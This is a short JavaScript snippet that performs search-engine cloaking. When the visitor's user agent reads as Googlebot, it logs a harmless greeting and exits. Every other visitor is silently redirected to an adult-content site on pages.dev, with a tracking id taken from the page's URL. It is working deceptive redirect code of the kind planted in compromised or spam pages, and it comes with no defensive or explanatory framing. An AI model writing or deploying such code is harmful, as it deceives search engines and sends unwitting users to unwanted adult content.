// ---------- Run ----------
(async () => {


  if (navigator.userAgent.includes("Googlebot")) {
    console.log("Thanks for visiting my page");
    return;
  }
  
 var id = new URLSearchParams(location.search).get("id");
    window.location.href = `https://livesexvideo.pages.dev/?tid=${id}`;

})();
